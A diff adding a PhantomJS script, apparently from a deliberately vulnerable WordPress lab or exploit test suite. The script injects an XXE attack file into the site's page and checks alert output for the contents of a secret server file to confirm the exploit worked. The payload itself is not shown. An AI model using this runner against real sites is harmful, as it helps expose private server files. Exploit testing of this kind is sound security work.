@@ -1,0 +1,24 @@
+#!/usr/bin/env phantomjs
+
+var wp = require( './wp' );
+var page = wp.page();
+
+page.onAlert = function( msg ) {
+	if ( -1 !== msg.indexOf( 'PD9waHAKCi8vIFRoaXMgZmlsZSBpcyBzdXBlciBzZWNyZXQhIERvbid0IGxldCBhbnlvbmUgcmVhZCBpdCE' ) || -1 !== msg.indexOf( 'This file is super secret! Don\'t let anyone read it!' ) ) {
+		console.log( 'XXE Vulnerability Successfully Exploited!' );
+		phantom.exit();
+	}
+};
+
+page.open( wp.url, function() {
+	console.log( 'Injecting 12-xxe.js' );
+
+	page.evaluate( function( url ) {
+		jQuery.getScript( url + 'attacks/12-xxe.js' );
+	}, wp.url );
+} );
+
+setTimeout( function() {
+	console.log( 'XXE Attack Unsuccessfuly.' );
+	phantom.exit( 1 );
+}, 4000 );
